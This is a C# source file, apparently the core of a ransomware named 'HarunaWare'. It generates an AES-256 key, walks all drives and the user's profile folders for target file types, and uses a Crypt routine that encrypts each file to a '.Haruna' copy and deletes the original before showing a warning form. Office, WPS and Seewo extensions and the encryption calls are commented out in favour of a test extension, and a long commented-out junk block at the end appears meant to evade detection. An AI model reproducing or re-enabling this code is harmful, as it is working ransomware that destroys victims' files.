using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using HarunaWare.Properties;

namespace HarunaWare
{
	internal static class Program
    {
        
        // File extensions HarunaWare searches for

        private static readonly string[] targetExtensions = new string[]
		{   
            ".hrntst"
            /*
            ".ppt",
            ".pot",
            ".pps",
            ".ppa",
            ".pptx",
            ".pptm",
            ".potx",
            ".potm",
            ".ppsm",
            ".ppsx",
            ".ppam",
            ".wps",//wps
            ".dps",
            ".et",
            ".enb",//seewo
            ".enbx"*/
        };

		internal static List<string> encryptedFiles = new List<string>();

		internal static byte[] randomKey { get; set; }
		internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\luvkey.torpedo";

		internal static byte[] randomIV { get; set; }
		internal static readonly string IVFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\luviv.torpedo";

		[STAThread]
		private static void Main()
		{   // Check if the AES key and IV exist, and run the decryptor form if so
			if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
			{
				Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
				if (Program.randomKey.Length == 32)
				{
					Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
					if (Program.randomIV.Length == 16)
					{
						
						Application.Run(new frmManualDecrypter());
						return;
					}
				}
			}

			// If not, begin the main funny vine moment compilation 2015

			Program.randomIV = new byte[16];
			Program.randomKey = new byte[32];

			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
			rngcryptoServiceProvider.GetBytes(Program.randomIV);  // Generate the IV
			rngcryptoServiceProvider.GetBytes(Program.randomKey); // Generate the key

			string[] logicalDrives = Environment.GetLogicalDrives() ;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			foreach (string zesDrive in logicalDrives)
			{
                System.IO.DriveInfo di = new System.IO.DriveInfo(zesDrive);

                

                if (!di.IsReady)

                {
                    continue;
                }
            
                if (folderPath.Contains(zesDrive)) // Check if the drive has the windows system folder
				{   // We are most likely a windows drive, search the user's profile folder
					foreach (string path in System.IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
					{
						
						try
						{
							foreach (string fileName in System.IO.Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
                                        /*
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".Haruna");
                                        */
									}
								}
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					foreach (string fileName in System.IO.Directory.GetFiles(zesDrive) ) 

                    {
						
						try
						{
							foreach (string fileExt in Program.targetExtensions)
							{
								if (fileName.EndsWith(fileExt))
								{   // Encrypt the file
                                    /*
									Program.Crypt(fileName, false);
									Program.encryptedFiles.Add(fileName + ".Haruna");
                                    */
								}
							}
						}
						catch
						{
						}
					}

					// Search folders
					foreach (string zeFolders in System.IO.Directory.GetDirectories(zesDrive))
					{
						
						try
						{
							foreach (string fileName in System.IO.Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
                                        /*
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".Haruna");
                                        */
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			// Show the main form
			Application.Run(new frmWarning());
		}

		internal static void Crypt(string path, bool IsDecrypt = false)
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.IV = Program.randomIV;
				rijndaelManaged.Key = Program.randomKey;
				rijndaelManaged.KeySize = 256;               // AES-256
				rijndaelManaged.BlockSize = 128;
				rijndaelManaged.Mode = CipherMode.CBC;    // CBC mode
				rijndaelManaged.Padding = PaddingMode.PKCS7;

				ICryptoTransform transform = IsDecrypt ? rijndaelManaged.CreateDecryptor(Program.randomKey, Program.randomIV) : rijndaelManaged.CreateEncryptor(Program.randomKey, Program.randomIV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						byte[] fileData = File.ReadAllBytes(path);
						if ((long)fileData.Length >= 214748364L) // 2 GB
						{
							while (cryptoStream.Position != (long)fileData.Length - 1L)
							{
								cryptoStream.Write(fileData, 0, 1);
							}
						}
						else
						{
							cryptoStream.Write(fileData, 0, fileData.Length);
						}
					}

					// Create a seperate encrypted file, and delete the original one.
					File.WriteAllBytes(IsDecrypt ? path.Replace(".Haruna", string.Empty) : (path + ".Haruna"), memoryStream.ToArray());
					File.Delete(path);
				}
			}
		}
	}
}
/*
namespace maths
{
    class XRJ36FW0M2Q3KHARUNA
    {
        void M4M743QGB29P()
        {
            int D0ABK7042BISQ = 251367174;
            if (D0ABK7042BISQ > 251367154)
                D0ABK7042BISQ = 251367144;
            else if (D0ABK7042BISQ <= 251367176)
                D0ABK7042BISQ++;
            else
                D0ABK7042BISQ = (251367103 / 251367184);
            int DFD3E13YYZ064 = 251367157;
            if (DFD3E13YYZ064 > 251367183)
                DFD3E13YYZ064 = 251367156;
            else if (DFD3E13YYZ064 <= 251367107)
                DFD3E13YYZ064++;
            else
                DFD3E13YYZ064 = (251367187 / 251367147);
            bool DB92G55W4MLK2 = true;
            if (!DB92G55W4MLK2)
                DB92G55W4MLK2 = true;
            else if (DB92G55W4MLK2 = false)
                DB92G55W4MLK2 = false;
            else
                DB92G55W4MLK2 = false;
            bool D4IXLFY2IJMMS = false;
            if (!D4IXLFY2IJMMS)
                D4IXLFY2IJMMS = false;
            else if (D4IXLFY2IJMMS = false)
                D4IXLFY2IJMMS = true;
            else
                D4IXLFY2IJMMS = false;
            bool D6XSA4X18LRGL = false;
            if (!D6XSA4X18LRGL)
                D6XSA4X18LRGL = false;
            else if (D6XSA4X18LRGL = true)
                D6XSA4X18LRGL = false;
            else
                D6XSA4X18LRGL = true;
            bool D1W5Q44DW2XXP = true;
            if (!D1W5Q44DW2XXP)
                D1W5Q44DW2XXP = true;
            else if (D1W5Q44DW2XXP = true)
                D1W5Q44DW2XXP = false;
            else
                D1W5Q44DW2XXP = false;
            bool DM9K48WPN20GM = true;
            if (!DM9K48WPN20GM)
                DM9K48WPN20GM = true;
            else if (DM9K48WPN20GM = true)
                DM9K48WPN20GM = false;
            else
                DM9K48WPN20GM = true;
            int DQFIGNXEHWJII = 251367158;
            if (DQFIGNXEHWJII > 251367175)
                DQFIGNXEHWJII = 251367110;
            else if (DQFIGNXEHWJII <= 251367158)
                DQFIGNXEHWJII++;
            else
                DQFIGNXEHWJII = (251367186 / 251367187);
            int DPAXEQWN2G0Z0 = 251367146;
            if (DPAXEQWN2G0Z0 > 251367121)
                DPAXEQWN2G0Z0 = 251367171;
            else if (DPAXEQWN2G0Z0 <= 251367188)
                DPAXEQWN2G0Z0++;
            else
                DPAXEQWN2G0Z0 = (251367126 / 251367152);
            int DNLFEPLSOW3SF = 251367150;
            if (DNLFEPLSOW3SF > 251367139)
                DNLFEPLSOW3SF = 251367134;
            else if (DNLFEPLSOW3SF <= 251367135)
                DNLFEPLSOW3SF++;
            else
                DNLFEPLSOW3SF = (251367143 / 251367183);
            bool DPKAMX7MP2ZXS = true;
            if (!DPKAMX7MP2ZXS)
                DPKAMX7MP2ZXS = true;
            else if (DPKAMX7MP2ZXS = false)
                DPKAMX7MP2ZXS = false;
            else
                DPKAMX7MP2ZXS = true;
            bool D492FKZ73HB4Z = true;
            if (!D492FKZ73HB4Z)
                D492FKZ73HB4Z = true;
            else if (D492FKZ73HB4Z = true)
                D492FKZ73HB4Z = true;
            else
                D492FKZ73HB4Z = true;
            int D3DXSC8G7G6N8 = 251367132;
            if (D3DXSC8G7G6N8 > 251367136)
                D3DXSC8G7G6N8 = 251367182;
            else if (D3DXSC8G7G6N8 <= 251367190)
                D3DXSC8G7G6N8++;
            else
                D3DXSC8G7G6N8 = (251367189 / 251367149);
            int D5YAZ64KL9HFI = 251367155;
            if (D5YAZ64KL9HFI > 251367176)
                D5YAZ64KL9HFI = 251367140;
            else if (D5YAZ64KL9HFI <= 251367187)
                D5YAZ64KL9HFI++;
            else
                D5YAZ64KL9HFI = (251367115 / 251367131);
            bool D3A1Z66ON77QI = false;
            if (!D3A1Z66ON77QI)
                D3A1Z66ON77QI = false;
            else if (D3A1Z66ON77QI = false)
                D3A1Z66ON77QI = false;
            else
                D3A1Z66ON77QI = true;
            int DKJOKE3Y13S8M = 251367168;
            if (DKJOKE3Y13S8M > 251367150)
                DKJOKE3Y13S8M = 251367180;
            else if (DKJOKE3Y13S8M <= 251367114)
                DKJOKE3Y13S8M++;
            else
                DKJOKE3Y13S8M = (251367149 / 251367159);
            int DRCK2OPYJ1HWO = 251367106;
            if (DRCK2OPYJ1HWO > 251367162)
                DRCK2OPYJ1HWO = 251367119;
            else if (DRCK2OPYJ1HWO <= 251367138)
                DRCK2OPYJ1HWO++;
            else
                DRCK2OPYJ1HWO = (251367153 / 251367104);
            bool DX02CXDQKAAP7 = false;
            if (!DX02CXDQKAAP7)
                DX02CXDQKAAP7 = true;
            else if (DX02CXDQKAAP7 = true)
                DX02CXDQKAAP7 = true;
            else
                DX02CXDQKAAP7 = true;
            bool DOJAJG4E3J815 = true;
            if (!DOJAJG4E3J815)
                DOJAJG4E3J815 = true;
            else if (DOJAJG4E3J815 = false)
                DOJAJG4E3J815 = true;
            else
                DOJAJG4E3J815 = true;
            bool D3O8N4GM31GB7 = true;
            if (!D3O8N4GM31GB7)
                D3O8N4GM31GB7 = true;
            else if (D3O8N4GM31GB7 = true)
                D3O8N4GM31GB7 = true;
            else
                D3O8N4GM31GB7 = true;
            bool DDK06Y3MOKNEH = true;
            if (!DDK06Y3MOKNEH)
                DDK06Y3MOKNEH = true;
            else if (DDK06Y3MOKNEH = true)
                DDK06Y3MOKNEH = false;
            else
                DDK06Y3MOKNEH = false;
            int DCOGCBLBQSI76 = 251367111;
            if (DCOGCBLBQSI76 > 251367178)
                DCOGCBLBQSI76 = 251367195;
            else if (DCOGCBLBQSI76 <= 251367184)
                DCOGCBLBQSI76++;
            else
                DCOGCBLBQSI76 = (251367134 / 251367109);
            bool DOQ2KPCQXKGBC = true;
            if (!DOQ2KPCQXKGBC)
                DOQ2KPCQXKGBC = true;
            else if (DOQ2KPCQXKGBC = true)
                DOQ2KPCQXKGBC = true;
            else
                DOQ2KPCQXKGBC = true;
            bool DSHWXRPKKDM2M = false;
            if (!DSHWXRPKKDM2M)
                DSHWXRPKKDM2M = true;
            else if (DSHWXRPKKDM2M = true)
                DSHWXRPKKDM2M = false;
            else
                DSHWXRPKKDM2M = true;
            int DJJLXZHQ4BCYX = 251367110;
            if (DJJLXZHQ4BCYX > 251367116)
                DJJLXZHQ4BCYX = 251367171;
            else if (DJJLXZHQ4BCYX <= 251367177)
                DJJLXZHQ4BCYX++;
            else
                DJJLXZHQ4BCYX = (251367143 / 251367117);
            int D21ZGHS978CPQ = 251367143;
            if (D21ZGHS978CPQ > 251367105)
                D21ZGHS978CPQ = 251367102;
            else if (D21ZGHS978CPQ <= 251367119)
                D21ZGHS978CPQ++;
            else
                D21ZGHS978CPQ = (251367152 / 251367128);
            int DGZXXOX6ZAC92 = 251367188;
            if (DGZXXOX6ZAC92 > 251367186)
                DGZXXOX6ZAC92 = 251367122;
            else if (DGZXXOX6ZAC92 <= 251367125)
                DGZXXOX6ZAC92++;
            else
                DGZXXOX6ZAC92 = (251367129 / 251367171);
            bool DNRHD061PIGS0 = true;
            if (!DNRHD061PIGS0)
                DNRHD061PIGS0 = true;
            else if (DNRHD061PIGS0 = true)
                DNRHD061PIGS0 = true;
            else
                DNRHD061PIGS0 = true;
            int D46JBM8DA7Q0C = 251367111;
            if (D46JBM8DA7Q0C > 251367106)
                D46JBM8DA7Q0C = 251367151;
            else if (D46JBM8DA7Q0C <= 251367125)
                D46JBM8DA7Q0C++;
            else
                D46JBM8DA7Q0C = (251367147 / 251367189);
            int DILDF2RJCCS26 = 251367115;
            if (DILDF2RJCCS26 > 251367174)
                DILDF2RJCCS26 = 251367119;
            else if (DILDF2RJCCS26 <= 251367162)
                DILDF2RJCCS26++;
            else
                DILDF2RJCCS26 = (251367141 / 251367176);
            int D2OBL8NMYIZLA = 251367118;
            if (D2OBL8NMYIZLA > 251367199)
                D2OBL8NMYIZLA = 251367146;
            else if (D2OBL8NMYIZLA <= 251367115)
                D2OBL8NMYIZLA++;
            else
                D2OBL8NMYIZLA = (251367165 / 251367173);
            bool DJAM53RHEAWWH = true;
            if (!DJAM53RHEAWWH)
                DJAM53RHEAWWH = false;
            else if (DJAM53RHEAWWH = true)
                DJAM53RHEAWWH = false;
            else
                DJAM53RHEAWWH = true;
        }
    }
}
namespace important_core
{
    class harunaXRJ36FW0M2Q3K
    {
        void M4M743QGB29P()
        {
            int D0ABK7042BISQ = 251367174;
            if (D0ABK7042BISQ > 251367154)
                D0ABK7042BISQ = 251367144;
            else if (D0ABK7042BISQ <= 251367176)
                D0ABK7042BISQ++;
            else
                D0ABK7042BISQ = (251367103 / 251367184);
            int DFD3E13YYZ064 = 251367157;
            if (DFD3E13YYZ064 > 251367183)
                DFD3E13YYZ064 = 251367156;
            else if (DFD3E13YYZ064 <= 251367107)
                DFD3E13YYZ064++;
            else
                DFD3E13YYZ064 = (251367187 / 251367147);
            bool DB92G55W4MLK2 = true;
            if (!DB92G55W4MLK2)
                DB92G55W4MLK2 = true;
            else if (DB92G55W4MLK2 = false)
                DB92G55W4MLK2 = false;
            else
                DB92G55W4MLK2 = false;
            bool D4IXLFY2IJMMS = false;
            if (!D4IXLFY2IJMMS)
                D4IXLFY2IJMMS = false;
            else if (D4IXLFY2IJMMS = false)
                D4IXLFY2IJMMS = true;
            else
                D4IXLFY2IJMMS = false;
            bool D6XSA4X18LRGL = false;
            if (!D6XSA4X18LRGL)
                D6XSA4X18LRGL = false;
            else if (D6XSA4X18LRGL = true)
                D6XSA4X18LRGL = false;
            else
                D6XSA4X18LRGL = true;
            bool D1W5Q44DW2XXP = true;
            if (!D1W5Q44DW2XXP)
                D1W5Q44DW2XXP = true;
            else if (D1W5Q44DW2XXP = true)
                D1W5Q44DW2XXP = false;
            else
                D1W5Q44DW2XXP = false;
            bool DM9K48WPN20GM = true;
            if (!DM9K48WPN20GM)
                DM9K48WPN20GM = true;
            else if (DM9K48WPN20GM = true)
                DM9K48WPN20GM = false;
            else
                DM9K48WPN20GM = true;
            int DQFIGNXEHWJII = 251367158;
            if (DQFIGNXEHWJII > 251367175)
                DQFIGNXEHWJII = 251367110;
            else if (DQFIGNXEHWJII <= 251367158)
                DQFIGNXEHWJII++;
            else
                DQFIGNXEHWJII = (251367186 / 251367187);
            int DPAXEQWN2G0Z0 = 251367146;
            if (DPAXEQWN2G0Z0 > 251367121)
                DPAXEQWN2G0Z0 = 251367171;
            else if (DPAXEQWN2G0Z0 <= 251367188)
                DPAXEQWN2G0Z0++;
            else
                DPAXEQWN2G0Z0 = (251367126 / 251367152);
            int DNLFEPLSOW3SF = 251367150;
            if (DNLFEPLSOW3SF > 251367139)
                DNLFEPLSOW3SF = 251367134;
            else if (DNLFEPLSOW3SF <= 251367135)
                DNLFEPLSOW3SF++;
            else
                DNLFEPLSOW3SF = (251367143 / 251367183);
            bool DPKAMX7MP2ZXS = true;
            if (!DPKAMX7MP2ZXS)
                DPKAMX7MP2ZXS = true;
            else if (DPKAMX7MP2ZXS = false)
                DPKAMX7MP2ZXS = false;
            else
                DPKAMX7MP2ZXS = true;
            bool D492FKZ73HB4Z = true;
            if (!D492FKZ73HB4Z)
                D492FKZ73HB4Z = true;
            else if (D492FKZ73HB4Z = true)
                D492FKZ73HB4Z = true;
            else
                D492FKZ73HB4Z = true;
            int D3DXSC8G7G6N8 = 251367132;
            if (D3DXSC8G7G6N8 > 251367136)
                D3DXSC8G7G6N8 = 251367182;
            else if (D3DXSC8G7G6N8 <= 251367190)
                D3DXSC8G7G6N8++;
            else
                D3DXSC8G7G6N8 = (251367189 / 251367149);
            int D5YAZ64KL9HFI = 251367155;
            if (D5YAZ64KL9HFI > 251367176)
                D5YAZ64KL9HFI = 251367140;
            else if (D5YAZ64KL9HFI <= 251367187)
                D5YAZ64KL9HFI++;
            else
                D5YAZ64KL9HFI = (251367115 / 251367131);
            bool D3A1Z66ON77QI = false;
            if (!D3A1Z66ON77QI)
                D3A1Z66ON77QI = false;
            else if (D3A1Z66ON77QI = false)
                D3A1Z66ON77QI = false;
            else
                D3A1Z66ON77QI = true;
            int DKJOKE3Y13S8M = 251367168;
            if (DKJOKE3Y13S8M > 251367150)
                DKJOKE3Y13S8M = 251367180;
            else if (DKJOKE3Y13S8M <= 251367114)
                DKJOKE3Y13S8M++;
            else
                DKJOKE3Y13S8M = (251367149 / 251367159);
            int DRCK2OPYJ1HWO = 251367106;
            if (DRCK2OPYJ1HWO > 251367162)
                DRCK2OPYJ1HWO = 251367119;
            else if (DRCK2OPYJ1HWO <= 251367138)
                DRCK2OPYJ1HWO++;
            else
                DRCK2OPYJ1HWO = (251367153 / 251367104);
            bool DX02CXDQKAAP7 = false;
            if (!DX02CXDQKAAP7)
                DX02CXDQKAAP7 = true;
            else if (DX02CXDQKAAP7 = true)
                DX02CXDQKAAP7 = true;
            else
                DX02CXDQKAAP7 = true;
            bool DOJAJG4E3J815 = true;
            if (!DOJAJG4E3J815)
                DOJAJG4E3J815 = true;
            else if (DOJAJG4E3J815 = false)
                DOJAJG4E3J815 = true;
            else
                DOJAJG4E3J815 = true;
            bool D3O8N4GM31GB7 = true;
            if (!D3O8N4GM31GB7)
                D3O8N4GM31GB7 = true;
            else if (D3O8N4GM31GB7 = true)
                D3O8N4GM31GB7 = true;
            else
                D3O8N4GM31GB7 = true;
            bool DDK06Y3MOKNEH = true;
            if (!DDK06Y3MOKNEH)
                DDK06Y3MOKNEH = true;
            else if (DDK06Y3MOKNEH = true)
                DDK06Y3MOKNEH = false;
            else
                DDK06Y3MOKNEH = false;
            int DCOGCBLBQSI76 = 251367111;
            if (DCOGCBLBQSI76 > 251367178)
                DCOGCBLBQSI76 = 251367195;
            else if (DCOGCBLBQSI76 <= 251367184)
                DCOGCBLBQSI76++;
            else
                DCOGCBLBQSI76 = (251367134 / 251367109);
            bool DOQ2KPCQXKGBC = true;
            if (!DOQ2KPCQXKGBC)
                DOQ2KPCQXKGBC = true;
            else if (DOQ2KPCQXKGBC = true)
                DOQ2KPCQXKGBC = true;
            else
                DOQ2KPCQXKGBC = true;
            bool DSHWXRPKKDM2M = false;
            if (!DSHWXRPKKDM2M)
                DSHWXRPKKDM2M = true;
            else if (DSHWXRPKKDM2M = true)
                DSHWXRPKKDM2M = false;
            else
                DSHWXRPKKDM2M = true;
            int DJJLXZHQ4BCYX = 251367110;
            if (DJJLXZHQ4BCYX > 251367116)
                DJJLXZHQ4BCYX = 251367171;
            else if (DJJLXZHQ4BCYX <= 251367177)
                DJJLXZHQ4BCYX++;
            else
                DJJLXZHQ4BCYX = (251367143 / 251367117);
            int D21ZGHS978CPQ = 251367143;
            if (D21ZGHS978CPQ > 251367105)
                D21ZGHS978CPQ = 251367102;
            else if (D21ZGHS978CPQ <= 251367119)
                D21ZGHS978CPQ++;
            else
                D21ZGHS978CPQ = (251367152 / 251367128);
            int DGZXXOX6ZAC92 = 251367188;
            if (DGZXXOX6ZAC92 > 251367186)
                DGZXXOX6ZAC92 = 251367122;
            else if (DGZXXOX6ZAC92 <= 251367125)
                DGZXXOX6ZAC92++;
            else
                DGZXXOX6ZAC92 = (251367129 / 251367171);
            bool DNRHD061PIGS0 = true;
            if (!DNRHD061PIGS0)
                DNRHD061PIGS0 = true;
            else if (DNRHD061PIGS0 = true)
                DNRHD061PIGS0 = true;
            else
                DNRHD061PIGS0 = true;
            int D46JBM8DA7Q0C = 251367111;
            if (D46JBM8DA7Q0C > 251367106)
                D46JBM8DA7Q0C = 251367151;
            else if (D46JBM8DA7Q0C <= 251367125)
                D46JBM8DA7Q0C++;
            else
                D46JBM8DA7Q0C = (251367147 / 251367189);
            int DILDF2RJCCS26 = 251367115;
            if (DILDF2RJCCS26 > 251367174)
                DILDF2RJCCS26 = 251367119;
            else if (DILDF2RJCCS26 <= 251367162)
                DILDF2RJCCS26++;
            else
                DILDF2RJCCS26 = (251367141 / 251367176);
            int D2OBL8NMYIZLA = 251367118;
            if (D2OBL8NMYIZLA > 251367199)
                D2OBL8NMYIZLA = 251367146;
            else if (D2OBL8NMYIZLA <= 251367115)
                D2OBL8NMYIZLA++;
            else
                D2OBL8NMYIZLA = (251367165 / 251367173);
            bool DJAM53RHEAWWH = true;
            if (!DJAM53RHEAWWH)
                DJAM53RHEAWWH = false;
            else if (DJAM53RHEAWWH = true)
                DJAM53RHEAWWH = false;
            else
                DJAM53RHEAWWH = true;
        }
    }
}
*/